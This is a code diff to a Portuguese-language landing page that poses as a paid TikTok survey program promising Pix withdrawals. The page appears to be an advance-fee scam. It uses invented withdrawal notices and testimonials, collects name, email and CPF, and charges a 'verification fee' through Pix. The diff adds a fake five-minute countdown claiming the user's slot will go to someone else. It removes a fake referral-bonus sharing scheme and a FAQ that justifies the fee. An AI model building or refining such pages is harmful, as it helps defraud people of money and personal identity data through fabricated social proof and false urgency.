@@ -272,7 +272,7 @@
       </button>
     </div>
 
-    <!-- ETAPA 7: Validação do Vídeo (Reprodutor Otimizado Nativo Sem Tela Preta) -->
+    <!-- ETAPA 7: Validação do Vídeo com Cronômetro de Urgência -->
     <div id="step-7" class="step-view hidden bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-5">
       <div class="text-center space-y-1">
         <h2 class="text-xl font-bold text-slate-900">Confirmação de Visualização</h2>
@@ -280,7 +280,7 @@
       </div>
       
       <div id="video-container" class="w-full aspect-[9/16] max-h-[340px] bg-slate-900 rounded-2xl overflow-hidden relative shadow-inner flex items-center justify-center">
-        <!-- Capa do Vídeo com clique direto de reprodução -->
+        <!-- Capa de Início -->
         <div id="video-preview-card" onclick="startVideoPlayback()" class="w-full h-full flex flex-col items-center justify-center bg-gradient-to-b from-slate-800 to-black p-4 text-center cursor-pointer group">
           <div class="w-16 h-16 bg-pink-600 group-hover:bg-pink-500 text-white rounded-full flex items-center justify-center text-2xl shadow-lg pl-1 transition-all group-active:scale-95 animate-pulse">
             ▶
@@ -298,6 +298,13 @@
         <div class="w-full bg-slate-100 h-2.5 rounded-full overflow-hidden">
           <div id="timer-bar" class="bg-pink-600 h-full w-0 transition-all duration-1000"></div>
         </div>
+      </div>
+
+      <!-- Caixa de Urgência / Cronômetro de Conclusão -->
+      <div id="urgency-box" class="hidden bg-rose-50 border border-rose-100 p-3.5 rounded-2xl text-center space-y-1">
+        <p class="text-[11px] font-bold text-rose-600 uppercase tracking-wider">⚠️ TEMPO PARA SOLICITAR O SAQUE:</p>
+        <div id="urgency-countdown" class="text-2xl font-black text-rose-700 font-mono">05:00</div>
+        <p class="text-[10px] text-slate-400">Se expirar, a vaga será repassada para o próximo usuário da região.</p>
       </div>
 
       <button id="btn-video-done" onclick="proceedToPayScreen()" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
@@ -406,7 +413,7 @@
       </button>
     </div>
 
-    <!-- SEÇÃO NOVAS AVALIAÇÕES (QUEM JÁ SACOU HOJE) -->
+    <!-- SEÇÃO NOVAS AVALIAÇÕES -->
     <div class="space-y-3 pt-2">
       <div class="flex items-center justify-between px-1">
         <h3 class="text-xs font-black uppercase tracking-wider text-slate-700">QUEM JÁ SACOU HOJE</h3>
@@ -417,7 +424,6 @@
       </div>
 
       <div class="flex gap-3 overflow-x-auto no-scrollbar pb-1 snap-x">
-        <!-- Card 1 -->
         <div class="snap-start shrink-0 w-[240px] bg-white rounded-2xl p-4 border border-slate-100 shadow-sm space-y-2.5">
           <div class="flex items-center justify-between">
             <div class="flex items-center gap-2.5">
@@ -432,7 +438,6 @@
           <p class="text-xs text-slate-600 leading-snug">"genteee, ta funcionando dmssss pingou aqui!!"</p>
         </div>
 
-        <!-- Card 2 -->
         <div class="snap-start shrink-0 w-[240px] bg-white rounded-2xl p-4 border border-slate-100 shadow-sm space-y-2.5">
           <div class="flex items-center justify-between">
             <div class="flex items-center gap-2.5">
@@ -445,134 +450,6 @@
             <div class="text-amber-400 text-xs">★★★★<span class="text-slate-200">★</span></div>
           </div>
           <p class="text-xs text-slate-600 leading-snug">"Aqui demorou um pouquinho no Pix por causa do banco, mas caiu certinho! Valeu d+!"</p>
-        </div>
-
-        <!-- Card 3 -->
-        <div class="snap-start shrink-0 w-[240px] bg-white rounded-2xl p-4 border border-slate-100 shadow-sm space-y-2.5">
-          <div class="flex items-center justify-between">
-            <div class="flex items-center gap-2.5">
-              <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100&auto=format&fit=crop&q=80" alt="Camila" class="w-9 h-9 rounded-full object-cover">
-              <div>
-                <p class="font-bold text-xs text-slate-900">Camila Rocha</p>
-                <p class="text-[10px] text-slate-400">há 27 min</p>
-              </div>
-            </div>
-            <div class="text-amber-400 text-xs">★★★★★</div>
-          </div>
-          <p class="text-xs text-slate-600 leading-snug">"to amando kkkk paguei as continhas e sobrou troco"</p>
-        </div>
-
-        <!-- Card 4 -->
-        <div class="snap-start shrink-0 w-[240px] bg-white rounded-2xl p-4 border border-slate-100 shadow-sm space-y-2.5">
-          <div class="flex items-center justify-between">
-            <div class="flex items-center gap-2.5">
-              <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=100&auto=format&fit=crop&q=80" alt="Matheus" class="w-9 h-9 rounded-full object-cover">
-              <div>
-                <p class="font-bold text-xs text-slate-900">Matheus Viana</p>
-                <p class="text-[10px] text-slate-400">há 41 min</p>
-              </div>
-            </div>
-            <div class="text-amber-400 text-xs">★★★★★</div>
-          </div>
-          <p class="text-xs text-slate-600 leading-snug">"Rápido e direto ao ponto. Indiquei pra 2 amigos e liberou o bônus na hora!"</p>
-        </div>
-      </div>
-    </div>
-
-    <!-- SEÇÃO 1: CONVIDAR AMIGOS & AUMENTAR SALDO -->
-    <div class="bg-gradient-to-br from-pink-600 to-rose-600 rounded-3xl p-5 text-white shadow-xl shadow-pink-100 space-y-4">
-      <div class="flex items-center justify-between">
-        <span class="text-[10px] font-extrabold bg-white/20 px-2.5 py-1 rounded-full uppercase tracking-wider">Programa Indique & Ganhe</span>
-        <span class="text-xs font-bold text-yellow-300">Ganhe até +R$ 400,00</span>
-      </div>
-
-      <div class="space-y-1">
-        <h3 class="text-lg font-black leading-tight">Convide amigos para aumentar seu saldo!</h3>
-        <p class="text-xs text-pink-100 leading-relaxed">Compartilhe o link do programa no WhatsApp. A cada compartilhamento seu saldo aumenta na hora!</p>
-      </div>
-
-      <!-- Grade de Bônus Progressivos -->
-      <div class="grid grid-cols-3 gap-2 py-1 text-center">
-        <div id="bonus-card-1" class="bg-white/10 border border-white/20 rounded-2xl p-2.5 backdrop-blur-xs transition-all">
-          <p class="text-[10px] text-pink-200 font-bold uppercase">1º Amigo</p>
-          <p class="text-base font-black text-amber-300">+R$ 50</p>
-          <span id="bonus-badge-1" class="text-[9px] bg-white/20 px-1.5 py-0.5 rounded-full mt-1 inline-block">Pendente</span>
-        </div>
-        <div id="bonus-card-2" class="bg-white/10 border border-white/20 rounded-2xl p-2.5 backdrop-blur-xs transition-all">
-          <p class="text-[10px] text-pink-200 font-bold uppercase">2º Amigo</p>
-          <p class="text-base font-black text-amber-300">+R$ 100</p>
-          <span id="bonus-badge-2" class="text-[9px] bg-white/20 px-1.5 py-0.5 rounded-full mt-1 inline-block">Pendente</span>
-        </div>
-        <div id="bonus-card-3" class="bg-white/10 border border-white/20 rounded-2xl p-2.5 backdrop-blur-xs transition-all">
-          <p class="text-[10px] text-pink-200 font-bold uppercase">Em Grupo</p>
-          <p class="text-base font-black text-amber-300">+R$ 250</p>
-          <span id="bonus-badge-3" class="text-[9px] bg-white/20 px-1.5 py-0.5 rounded-full mt-1 inline-block">Pendente</span>
-        </div>
-      </div>
-
-      <!-- Botão Único de Compartilhamento -->
-      <button onclick="shareLink()" id="btn-share-link" class="w-full bg-amber-400 hover:bg-amber-300 active:scale-[0.98] text-slate-900 font-black py-3.5 px-4 rounded-xl shadow-lg transition-all cursor-pointer flex items-center justify-center space-x-2 text-sm">
-        <span class="text-lg">📲</span>
-        <span id="share-btn-text">COMPARTILHAR NO WHATSAPP (+R$ 50,00)</span>
-      </button>
-
-      <!-- Código de Convite -->
-      <div class="flex items-center justify-between bg-black/20 rounded-xl px-3 py-2 text-xs">
-        <span class="text-pink-200">Seu código exclusivo:</span>
-        <span class="font-mono font-bold text-amber-300 tracking-wider">TK882910</span>
-      </div>
-    </div>
-
-    <!-- SEÇÃO 2: DÚVIDAS FREQUENTES (FAQ) -->
-    <div class="bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-4">
-      <div class="space-y-1">
-        <h3 class="text-lg font-extrabold text-slate-900">Dúvidas Frequentes</h3>
-        <p class="text-xs text-slate-500">Tire suas dúvidas sobre o saque e a plataforma.</p>
-      </div>
-
-      <div class="space-y-2.5">
-        <!-- FAQ 1 -->
-        <div class="border border-slate-100 rounded-2xl overflow-hidden transition-all">
-          <button onclick="toggleFaq(1)" class="w-full text-left p-4 bg-slate-50 hover:bg-slate-100 transition-colors font-bold text-xs text-slate-800 flex items-center justify-between cursor-pointer">
-            <span>Quando o dinheiro cai na minha conta?</span>
-            <span id="faq-icon-1" class="text-base font-black text-slate-400">+</span>
-          </button>
-          <div id="faq-answer-1" class="hidden p-4 text-xs text-slate-600 bg-white border-t border-slate-100 leading-relaxed">
-            Assim que a taxa única de verificação for confirmada via PIX, o valor total acumulado no seu saldo é enviado instantaneamente para a sua chave Pix cadastrada.
-          </div>
-        </div>
-
-        <!-- FAQ 2 -->
-        <div class="border border-slate-100 rounded-2xl overflow-hidden transition-all">
-          <button onclick="toggleFaq(2)" class="w-full text-left p-4 bg-slate-50 hover:bg-slate-100 transition-colors font-bold text-xs text-slate-800 flex items-center justify-between cursor-pointer">
-            <span>Por que preciso pagar a taxa de verificação?</span>
-            <span id="faq-icon-2" class="text-base font-black text-slate-400">+</span>
-          </button>
-          <div id="faq-answer-2" class="hidden p-4 text-xs text-slate-600 bg-white border-t border-slate-100 leading-relaxed">
-            A taxa simbólica serve para autenticar que você é uma pessoa real, evitar robôs e fraudes no sistema, além de cobrir os custos de transferência bancária instantânea.
-          </div>
-        </div>
-
-        <!-- FAQ 3 -->
-        <div class="border border-slate-100 rounded-2xl overflow-hidden transition-all">
-          <button onclick="toggleFaq(3)" class="w-full text-left p-4 bg-slate-50 hover:bg-slate-100 transition-colors font-bold text-xs text-slate-800 flex items-center justify-between cursor-pointer">
-            <span>Minha chave PIX precisa estar no meu CPF?</span>
-            <span id="faq-icon-3" class="text-base font-black text-slate-400">+</span>
-          </button>
-          <div id="faq-answer-3" class="hidden p-4 text-xs text-slate-600 bg-white border-t border-slate-100 leading-relaxed">
-            Sim, a chave PIX precisa estar ativa e vinculada a uma conta bancária válida no Brasil em seu nome para garantir que o saldo seja entregue com segurança.
-          </div>
-        </div>
-
-        <!-- FAQ 4 -->
-        <div class="border border-slate-100 rounded-2xl overflow-hidden transition-all">
-          <button onclick="toggleFaq(4)" class="w-full text-left p-4 bg-slate-50 hover:bg-slate-100 transition-colors font-bold text-xs text-slate-800 flex items-center justify-between cursor-pointer">
-            <span>Qual o valor máximo permitido por saque?</span>
-            <span id="faq-icon-4" class="text-base font-black text-slate-400">+</span>
-          </button>
-          <div id="faq-answer-4" class="hidden p-4 text-xs text-slate-600 bg-white border-t border-slate-100 leading-relaxed">
-            O valor máximo por saque é de R$ 2.500,00 por dia por CPF.
-          </div>
         </div>
       </div>
     </div>
@@ -592,6 +469,8 @@
     const totalRequired = 40;
     let discountCountdown = 299;
     let discountInterval = null;
+    let urgencyInterval = null;
+    let urgencySeconds = 300; // 5 minutos
     let hasDiscountBeenApplied = false;
     let shareCount = 0;
     let isVideoPlaying = false;
@@ -600,8 +479,7 @@
       { name: "Ricardo Almeida de Castanhal", text: "sacou R$ 540,90" },
       { name: "Ana Silva de Castanhal", text: "sacou R$ 512,75" },
       { name: "Juliana Santos de Belém", text: "sacou R$ 872,75" },
-      { name: "Marcos Lima de Ananindeua", text: "sacou R$ 620,00" },
-      { name: "Carla Mendes de Marabá", text: "sacou R$ 872,75" }
+      { name: "Marcos Lima de Ananindeua", text: "sacou R$ 620,00" }
     ];
 
     window.addEventListener('DOMContentLoaded', () => {
@@ -609,74 +487,6 @@
       setupBackRedirect();
       setTimeout(initSocialProof, 1500);
     });
-
-    function shareLink() {
-      if (shareCount >= 3) return;
-      const shareUrl = window.location.href;
-      const shareText = "Olha esse programa oficial de pesquisas remuneradas do TikTok! Estou recebendo em tempo real no PIX: " + shareUrl;
-      openWhatsApp(shareText);
-    }
-
-    function openWhatsApp(text) {
-      window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(text)}`;
-      setTimeout(() => {
-        registerShareBonus();
-      }, 1500);
-    }
-
-    function registerShareBonus() {
-      shareCount++;
-      let bonusAmount = 0;
-
-      if (shareCount === 1) {
-        bonusAmount = 50.00;
-        updateBonusBadge(1, "✓ Recebido");
-        document.getElementById('share-btn-text').textContent = "COMPARTILHAR COM +1 AMIGO (+R$ 100,00)";
-      } else if (shareCount === 2) {
-        bonusAmount = 100.00;
-        updateBonusBadge(2, "✓ Recebido");
-        document.getElementById('share-btn-text').textContent = "COMPARTILHAR EM GRUPO (+R$ 250,00)";
-      } else if (shareCount === 3) {
-        bonusAmount = 250.00;
-        updateBonusBadge(3, "✓ Recebido");
-        document.getElementById('share-btn-text').textContent = "✓ BÔNUS MÁXIMO ATINGIDO!";
-        document.getElementById('btn-share-link').disabled = true;
-        document.getElementById('btn-share-link').classList.add('opacity-70', 'cursor-not-allowed');
-      }
-
-      if (bonusAmount > 0) {
-        userBalance += bonusAmount;
-        updateBalanceDisplay();
-        showToast("Bônus Adicionado!", `+ R$ ${bonusAmount.toFixed(2).replace('.', ',')} por compartilhar`);
-      }
-    }
-
-    function updateBonusBadge(cardNum, text) {
-      const card = document.getElementById(`bonus-card-${cardNum}`);
-      const badge = document.getElementById(`bonus-badge-${cardNum}`);
-      if (card && badge) {
-        card.classList.remove('bg-white/10');
-        card.classList.add('bg-emerald-500/30', 'border-emerald-400');
-        badge.textContent = text;
-        badge.classList.remove('bg-white/20');
-        badge.classList.add('bg-emerald-500', 'text-white', 'font-bold');
-      }
-    }
-
-    function toggleFaq(index) {
-      const answer = document.getElementById(`faq-answer-${index}`);
-      const icon = document.getElementById(`faq-icon-${index}`);
-      if (answer) {
-        const isHidden = answer.classList.contains('hidden');
-        if (isHidden) {
-          answer.classList.remove('hidden');
-          icon.textContent = '−';
-        } else {
-          answer.classList.add('hidden');
-          icon.textContent = '+';
-        }
-      }
-    }
 
     async function fetchUserLocation() {
       try {
@@ -686,7 +496,7 @@
           document.getElementById('user-location-text').textContent = `do ${data.region}`;
         }
       } catch (e) {
-        console.log("Não foi possível carregar a localização:", e);
+        console.log("Localização indisponível:", e);
       }
     }
 
@@ -780,27 +590,19 @@
 
     function verifyBirthDate() {
       const dateInput = document.getElementById('birth-date-input').value;
-
       if (!dateInput) {
         alert("Por favor, selecione sua data de nascimento.");
         return;
       }
-
       const today = new Date();
       const birthDate = new Date(dateInput);
-      
       let age = today.getFullYear() - birthDate.getFullYear();
       const m = today.getMonth() - birthDate.getMonth();
-      
-      if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
-        age--;
-      }
-
+      if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) age--;
       if (age < 18) {
         alert("Você precisa ter mais de 18 anos para participar.");
         return;
       }
-
       switchStep(2);
     }
 
@@ -860,10 +662,8 @@
     function updateBalanceDisplay() {
       const formatted = userBalance.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
       document.getElementById('header-balance').textContent = formatted;
-      
       const totalDisp = hasDiscountBeenApplied ? (userBalance + 150) : userBalance;
       const formattedTotal = totalDisp.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
-
       document.querySelectorAll('.total-balance-display').forEach(el => {
         el.textContent = formattedTotal;
       });
@@ -883,19 +683,17 @@
       document.getElementById('timer-status').textContent = "Clique no Play acima para iniciar";
       document.getElementById('timer-count').textContent = "40s restantes";
       document.getElementById('timer-bar').style.width = '0%';
+      document.getElementById('urgency-box').classList.add('hidden');
       
       isVideoPlaying = false;
       secondsWatched = 0;
-      if (videoTimer) {
-        clearInterval(videoTimer);
-        videoTimer = null;
-      }
+      urgencySeconds = 300;
+      if (videoTimer) clearInterval(videoTimer);
+      if (urgencyInterval) clearInterval(urgencyInterval);
     }
 
     function startVideoPlayback() {
       const container = document.getElementById('video-container');
-      
-      // Utiliza o formato direto embutido do player com flag de interação direta
       container.innerHTML = `<iframe id="yt-player" class="w-full h-full pointer-events-auto" src="https://www.youtube-nocookie.com/embed/Q6OJeydSN_Y?autoplay=1&playsinline=1&enablejsapi=1" title="YouTube Shorts" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`;
 
       if (!isVideoPlaying) {
@@ -907,10 +705,8 @@
     function stopVideoPlayer() {
       const container = document.getElementById('video-container');
       container.innerHTML = '';
-      if (videoTimer) {
-        clearInterval(videoTimer);
-        videoTimer = null;
-      }
+      if (videoTimer) clearInterval(videoTimer);
+      if (urgencyInterval) clearInterval(urgencyInterval);
       isVideoPlaying = false;
     }
 
@@ -938,6 +734,31 @@
           btnDone.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
           btnDone.classList.add('bg-pink-600', 'hover:bg-pink-700', 'text-white', 'cursor-pointer', 'shadow-md', 'shadow-pink-200');
           btnDone.textContent = "Solicitar Saque do Saldo";
+
+          // Exibe o cronômetro de urgência de 5 minutos
+          document.getElementById('urgency-box').classList.remove('hidden');
+          startUrgencyTimer();
+        }
+      }, 1000);
+    }
+
+    function startUrgencyTimer() {
+      if (urgencyInterval) clearInterval(urgencyInterval);
+      urgencyInterval = setInterval(() => {
+        let mins = Math.floor(urgencySeconds / 60);
+        let secs = urgencySeconds % 60;
+        mins = mins < 10 ? '0' + mins : mins;
+        secs = secs < 10 ? '0' + secs : secs;
+        
+        const urgencyEl = document.getElementById('urgency-countdown');
+        if (urgencyEl) urgencyEl.textContent = `${mins}:${secs}`;
+
+        if (urgencySeconds > 0) {
+          urgencySeconds--;
+        } else {
+          clearInterval(urgencyInterval);
+          // Se zerar, redireciona automaticamente para a tela de desconto especial
+          showDiscountScreen();
         }
       }, 1000);
     }
@@ -951,16 +772,14 @@
       const name = document.getElementById('pay-name').value.trim();
       const email = document.getElementById('pay-email').value.trim();
       const cpfInput = document.getElementById('pay-cpf').value.trim();
-      
       const cleanCpf = cpfInput.replace(/\D/g, '');
 
       if (!name || !email || !cpfInput) {
         alert("Por favor, preencha todos os campos.");
         return;
       }
-
       if (cleanCpf.length !== 11) {
-        alert("CPF inválido! Por favor digite exatamente os 11 números do seu CPF.");
+        alert("CPF inválido! Digite exatamente os 11 números do seu CPF.");
         document.getElementById('pay-cpf').focus();
         return;
       }
@@ -977,17 +796,15 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ name, email, cpf: cleanCpf, amount: customAmount })
         });
-
         const data = await response.json();
-
         if (data.pix_code) {
           document.getElementById('pix-code-text').value = data.pix_code;
         } else {
-          throw new Error(data.error || "Não foi possível retornar o código Pix.");
+          throw new Error(data.error || "Erro ao retornar Pix.");
         }
       } catch (err) {
         console.error("Erro:", err);
-        alert("Ocorreu um erro ao gerar o Pix. Verifique os dados informados.");
+        alert("Ocorreu um erro ao gerar o Pix. Verifique os dados.");
         switchStep(8);
       } finally {
         btnPay.disabled = false;
